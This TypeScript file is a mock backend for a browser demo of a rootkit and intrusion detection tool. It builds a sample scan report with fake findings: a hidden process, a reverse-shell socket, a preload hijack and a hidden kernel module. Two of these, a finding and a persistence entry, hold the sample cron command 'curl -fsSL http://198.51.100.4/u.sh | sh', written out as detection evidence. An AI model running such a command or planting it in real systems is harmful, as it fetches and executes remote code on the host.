// Browser-only demo backend so the UI can be developed and reviewed without
// the native shell. Never used inside the Tauri app.
import type { AppSettings, EnvCheck, Finding, HistoryEntry, ProcessInfo, ScanReport, ScanSummary, Suppressions, SystemInfo } from './types';
import { DEFAULT_SETTINGS, SEVERITY_RANK } from './types';

const now = () => Math.floor(Date.now() / 1000);
const host = { hostname: 'demo-host', os: 'Demo Linux 6.8 (browser preview)', os_version: '6.8', kernel_version: '6.8.0-demo', arch: 'x86_64', uptime_secs: 86400 * 3 };

function proc(pid: number, name: string, path: string, extra: Partial<ProcessInfo> = {}): ProcessInfo {
  return {
    pid, ppid: 1, name, path, cmdline: path, user: 'root', cpu_usage: Math.round(Math.random() * 30) / 10,
    memory_bytes: Math.round(Math.random() * 200e6), start_time: now() - 3600, is_discrepant: false,
    visibility: { api: true, syscall: true, brute_force: true }, flags: [], sha256: null, ...extra,
  };
}

function finding(f: Partial<Finding> & Pick<Finding, 'id' | 'category' | 'severity' | 'title'>): Finding {
  return { description: '', evidence: [], pid: null, path: null, mitre: null, recommendation: '', suppressed: false, ...f };
}

function buildReport(suppressed: Set<string>): ScanReport {
  const processes: ProcessInfo[] = [
    proc(1337, 'phantom_daemon', '/usr/bin/hidden_kernel_task', { is_discrepant: true, cpu_usage: 14.2, visibility: { api: false, syscall: false, brute_force: true }, flags: ['Kernel-hidden process: phantom_daemon (PID 1337)'], sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }),
    proc(1, 'systemd', '/usr/lib/systemd/systemd', { ppid: 0 }),
    proc(2, '[kthreadd]', '', { ppid: 0, user: 'root' }),
    proc(402, 'sshd', '/usr/sbin/sshd'),
    proc(611, 'cron', '/usr/sbin/cron'),
    proc(812, 'nginx', '/usr/sbin/nginx', { user: 'www-data' }),
    proc(2201, 'bash', '/usr/bin/bash', { user: 'www-data', ppid: 812, cmdline: 'bash -i', flags: ['Suspicious tcp socket 10.0.0.5:40112 → 203.0.113.9:4444 (bash)'] }),
    proc(3105, 'kworker/0:2', '/tmp/.X11-cache/kworker', { cmdline: '[kworker/0:2]', flags: ['Suspicious process: kworker/0:2 (PID 3105)'] }),
    proc(4410, 'python3', '/usr/bin/python3', { user: 'analyst', cmdline: 'python3 -m http.server 8000' }),
  ];
  const findings: Finding[] = [
    finding({ id: 'hidden-process-0001', category: 'hidden-process', severity: 'critical', title: 'Kernel-hidden process: phantom_daemon (PID 1337)', description: 'This PID answers direct probes of the PID space but is absent from every process enumeration. That is the signature of a kernel-mode rootkit.', evidence: ['visibility: api=false syscall=false brute_force=true', 'sha256: e3b0c442…'], pid: 1337, path: '/usr/bin/hidden_kernel_task', mitre: 'T1014', recommendation: 'Treat the host as compromised. Acquire memory and disk images before remediation.' }),
    finding({ id: 'hidden-socket-0002', category: 'hidden-socket', severity: 'critical', title: 'Hidden tcp listener on port 31337', description: 'The kernel refuses to bind this port, yet no socket-table entry accounts for it.', evidence: ['bind(tcp *:31337) -> EADDRINUSE, absent from socket table on two consecutive reads'], mitre: 'T1014', recommendation: 'Capture traffic to this port from another host.' }),
    finding({ id: 'loader-hijack-0003', category: 'loader-hijack', severity: 'critical', title: 'Global library preload configured (/etc/ld.so.preload)', description: 'Every dynamically linked program loads these libraries first.', evidence: ['preloaded: /usr/lib/x86_64-linux-gnu/libprocesshider.so'], path: '/etc/ld.so.preload', mitre: 'T1574.006', recommendation: 'Inspect the listed libraries from trusted media, then remove the file.' }),
    finding({ id: 'suspicious-socket-0004', category: 'suspicious-socket', severity: 'critical', title: 'Suspicious tcp socket 10.0.0.5:40112 → 203.0.113.9:4444 (bash)', description: 'A network socket matches indicators of a remote shell.', evidence: ['command shell `bash` owns a network socket (bind/reverse shell)', 'connected to remote port 4444 (Metasploit default handler port)'], pid: 2201, path: '/usr/bin/bash', mitre: 'T1059', recommendation: 'Identify the parent chain (nginx → bash suggests a web shell).' }),
    finding({ id: 'process-anomaly-0005', category: 'process-anomaly', severity: 'critical', title: 'Suspicious process: kworker/0:2 (PID 3105)', description: 'User-space process masquerading as a kernel thread.', evidence: ['user-space process (exe /tmp/.X11-cache/kworker) masquerading as kernel thread `kworker/0:2`', 'executes from a world-writable staging directory'], pid: 3105, path: '/tmp/.X11-cache/kworker', mitre: 'T1036.004', recommendation: 'Suspend it to preserve memory, then collect the binary.' }),
    finding({ id: 'persistence-0006', category: 'persistence', severity: 'high', title: 'Suspicious cron persistence: /etc/cron.d/0anacron-update', description: 'An autostart entry launches content matching malicious patterns.', evidence: ['command: curl -fsSL http://198.51.100.4/u.sh | sh', 'downloads and pipes a script into sh', 'modified within the last 7 days'], path: '/etc/cron.d/0anacron-update', mitre: 'T1053.003', recommendation: 'Remove the entry and hunt for the initial access vector.' }),
    finding({ id: 'hidden-module-0007', category: 'hidden-module', severity: 'critical', title: 'Hidden kernel module: diamorphine', description: 'Present in /sys/module but removed from /proc/modules.', evidence: ['/sys/module/diamorphine/initstate = live, but the module is missing from /proc/modules'], mitre: 'T1547.006', recommendation: 'Reboot into trusted media and inspect the module on disk.' }),
    finding({ id: 'kernel-integrity-0008', category: 'kernel-integrity', severity: 'medium', title: 'Kernel is tainted (value 12288)', description: 'Out-of-tree unsigned code was loaded.', evidence: ['bit 12: out-of-tree module loaded (O)', 'bit 13: unsigned module loaded (E)'], mitre: 'T1547.006' }),
    finding({ id: 'baseline-drift-0009', category: 'baseline-drift', severity: 'low', title: 'New network listener since baseline: tcp/8000 (python3)', description: 'Not present in the baseline.', evidence: ['0.0.0.0:8000'], pid: 4410, mitre: 'T1571' }),
  ].map((f) => ({ ...f, suppressed: suppressed.has(f.id) }));
  findings.sort((a, b) => Number(a.suppressed) - Number(b.suppressed) || SEVERITY_RANK[b.severity] - SEVERITY_RANK[a.severity]);
  const active = findings.filter((f) => !f.suppressed);
  const count = (s: string) => active.filter((f) => f.severity === s).length;
  const sockets: ScanReport['sockets'] = [
    { local_address: '*', local_port: 31337, remote_address: '*', remote_port: 0, protocol: 'tcp', state: 'HIDDEN', pid: null, process_name: null, suspicious: true, hidden: true, reasons: ['port bound in kernel but absent from socket table'] },
    { local_address: '10.0.0.5', local_port: 40112, remote_address: '203.0.113.9', remote_port: 4444, protocol: 'tcp', state: 'ESTABLISHED', pid: 2201, process_name: 'bash', suspicious: true, hidden: false, reasons: ['command shell `bash` owns a network socket'] },
    { local_address: '0.0.0.0', local_port: 22, remote_address: '0.0.0.0', remote_port: 0, protocol: 'tcp', state: 'LISTEN', pid: 402, process_name: 'sshd', suspicious: false, hidden: false, reasons: [] },
    { local_address: '0.0.0.0', local_port: 80, remote_address: '0.0.0.0', remote_port: 0, protocol: 'tcp', state: 'LISTEN', pid: 812, process_name: 'nginx', suspicious: false, hidden: false, reasons: [] },
    { local_address: '0.0.0.0', local_port: 8000, remote_address: '0.0.0.0', remote_port: 0, protocol: 'tcp', state: 'LISTEN', pid: 4410, process_name: 'python3', suspicious: false, hidden: false, reasons: [] },
    { local_address: '127.0.0.53', local_port: 53, remote_address: '*', remote_port: 0, protocol: 'udp', state: '-', pid: 390, process_name: 'systemd-resolve', suspicious: false, hidden: false, reasons: [] },
  ];
  const persistence: ScanReport['persistence'] = [
    { mechanism: 'cron', location: '/etc/cron.d/0anacron-update', target_path: '/bin/sh', command: 'curl -fsSL http://198.51.100.4/u.sh | sh', risk_level: 'high', reasons: ['downloads and pipes a script into sh', 'modified within the last 7 days'], modified: now() - 7200 },
    { mechanism: 'ld.so.preload', location: '/etc/ld.so.preload', target_path: '/usr/lib/x86_64-linux-gnu/libprocesshider.so', command: '/usr/lib/x86_64-linux-gnu/libprocesshider.so', risk_level: 'critical', reasons: ['library force-loaded into every dynamically linked process'], modified: now() - 7300 },
    { mechanism: 'systemd', location: '/etc/systemd/system/nginx.service', target_path: '/usr/sbin/nginx', command: '/usr/sbin/nginx -g daemon on;', risk_level: 'info', reasons: [], modified: now() - 86400 * 90 },
    { mechanism: 'cron', location: '/etc/crontab', target_path: 'cd', command: 'cd / && run-parts --report /etc/cron.hourly', risk_level: 'info', reasons: [], modified: now() - 86400 * 300 },
  ];
  const modules: ScanReport['modules'] = [
    { name: 'diamorphine', path: null, size: 16384, listed: false, corroborated: true, hidden: true, suspicious: true, reasons: ['/sys/module/diamorphine/initstate = live, but the module is missing from /proc/modules'] },
    { name: 'ext4', path: null, size: 1003520, listed: true, corroborated: true, hidden: false, suspicious: false, reasons: [] },
    { name: 'nf_tables', path: null, size: 376832, listed: true, corroborated: true, hidden: false, suspicious: false, reasons: [] },
  ];
  const summary: ScanSummary = {
    processes: processes.length, hidden_processes: 1, sockets: sockets.length, listening: 3, hidden_sockets: 1,
    persistence_entries: persistence.length, modules: modules.length, hidden_modules: 1,
    critical: count('critical'), high: count('high'), medium: count('medium'), low: count('low'), info: count('info'),
    suppressed: findings.length - active.length,
  };
  const weights: Record<string, number> = { info: 0, low: 1, medium: 5, high: 15, critical: 40 };
  let score = Math.min(100, active.reduce((s, f) => s + weights[f.severity], 0));
  if (summary.critical) score = Math.max(score, 70);
  return {
    scan_id: `${now().toString(16)}-demo`, tool_version: '0.1.0', started_at: now(), duration_ms: 2140,
    engine: 'demo', elevated: true, host, risk_score: score, summary, findings, processes, sockets, persistence, modules,
    stages: [
      { stage: 'processes', ok: true, duration_ms: 1420, message: null },
      { stage: 'network', ok: true, duration_ms: 1810, message: null },
      { stage: 'persistence', ok: true, duration_ms: 320, message: null },
      { stage: 'modules', ok: true, duration_ms: 12, message: null },
      { stage: 'integrity', ok: true, duration_ms: 4, message: null },
      { stage: 'analysis', ok: true, duration_ms: 0, message: null },
    ],
    cancelled: false,
  };
}

const state = {
  suppressions: { finding_ids: [] as string[], path_patterns: [] as string[] } as Suppressions,
  history: [] as ScanReport[],
  last: null as ScanReport | null,
  baseline: null as number | null,
  cancelled: false,
  schedule: false,
};

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

export async function mockBackend<T>(cmd: string, args?: Record<string, unknown>): Promise<T> {
  const ret = (v: unknown) => v as T;
  switch (cmd) {
    case 'get_system_info': {
      const info: SystemInfo = { host, elevated: true, engine: 'demo', version: '0.1.0', platform: 'browser', data_dir: '(in-memory demo)', has_baseline: state.baseline !== null, baseline_created_at: state.baseline, scanning: false };
      return ret(info);
    }
    case 'scan_system': {
      state.cancelled = false;
      const stages = ['Enumerating processes across API, syscall and brute-force layers', 'Reading socket tables and probing ports', 'Enumerating autostart locations', 'Cross-checking kernel modules', 'Running integrity checks', 'Correlating findings'];
      for (let i = 0; i < stages.length; i++) {
        if (state.cancelled) break;
        window.dispatchEvent(new CustomEvent('panoptic-mock-progress', { detail: { stage: 'demo', percent: Math.round((i / stages.length) * 100), message: stages[i] } }));
        await sleep(350);
      }
      const r = buildReport(new Set(state.suppressions.finding_ids));
      r.cancelled = state.cancelled;
      window.dispatchEvent(new CustomEvent('panoptic-mock-progress', { detail: { stage: 'analysis', percent: 100, message: 'Scan complete' } }));
      state.last = r;
      state.history.unshift(r);
      return ret(r);
    }
    case 'cancel_scan':
      state.cancelled = true;
      return ret(true);
    case 'terminate_process':
    case 'suspend_process':
    case 'resume_process':
      await sleep(150);
      if (args?.pid === 1) throw new Error('Refused: PID 1 is a core system process');
      return ret(undefined);
    case 'export_report':
      return ret(String(args?.path));
    case 'get_history': {
      const h: HistoryEntry[] = state.history.map((r) => ({ scan_id: r.scan_id, started_at: r.started_at, duration_ms: r.duration_ms, risk_score: r.risk_score, elevated: r.elevated, cancelled: r.cancelled, summary: r.summary }));
      return ret(h);
    }
    case 'load_report': {
      const r = state.history.find((x) => x.scan_id === args?.scanId);
      if (!r) throw new Error('Scan not found');
      state.last = r;
      return ret(r);
    }
    case 'delete_report':
      state.history = state.history.filter((x) => x.scan_id !== args?.scanId);
      return ret(undefined);
    case 'save_baseline':
      if (!state.last) throw new Error('No scan has been run yet');
      state.baseline = now();
      return ret(state.baseline);
    case 'clear_baseline':
      state.baseline = null;
      return ret(undefined);
    case 'get_suppressions':
      return ret(state.suppressions);
    case 'set_suppressions':
      state.suppressions = args?.suppressions as Suppressions;
      return ret(undefined);
    case 'set_finding_suppressed': {
      const id = String(args?.findingId);
      const set = new Set(state.suppressions.finding_ids);
      if (args?.suppressed) set.add(id);
      else set.delete(id);
      state.suppressions.finding_ids = [...set];
      const r = buildReport(set);
      if (state.last) r.scan_id = state.last.scan_id;
      state.last = r;
      return ret(r);
    }
    case 'relaunch_as_admin':
      throw new Error('Not available in the browser demo');
    case 'get_settings': {
      let settings = DEFAULT_SETTINGS;
      try {
        const raw = localStorage.getItem('panoptic:demo-settings');
        if (raw) settings = { ...DEFAULT_SETTINGS, ...JSON.parse(raw) };
      } catch {
        /* storage unavailable: defaults */
      }
      return ret({ settings, warning: null });
    }
    case 'save_settings': {
      const s = args?.settings as AppSettings;
      try {
        localStorage.setItem('panoptic:demo-settings', JSON.stringify(s));
      } catch {
        /* not persisted in this browser */
      }
      return ret(s);
    }
    case 'environment_checks': {
      await sleep(400);
      const checks: EnvCheck[] = [
        { id: 'elevation', ok: true, detail: 'Running with full privileges (demo)' },
        { id: 'engine', ok: true, detail: 'demo engine on browser' },
        { id: 'storage', ok: true, detail: '(in-memory demo)' },
        { id: 'cli', ok: true, detail: 'bundled panoptic-cli (demo)' },
        { id: 'scheduler', ok: true, detail: 'scheduler available (demo)' },
      ];
      return ret(checks);
    }
    case 'schedule_status':
      return ret({ installed: state.schedule, detail: state.schedule ? 'Ready (demo)' : 'not scheduled' });
    case 'set_schedule':
      state.schedule = Boolean((args?.config as { enabled: boolean }).enabled);
      return ret({ installed: state.schedule, detail: state.schedule ? 'Ready (demo)' : 'not scheduled' });
    case 'export_asff':
      return ret([String(args?.path)]);
    default:
      throw new Error(`Unknown command ${cmd}`);
  }
}
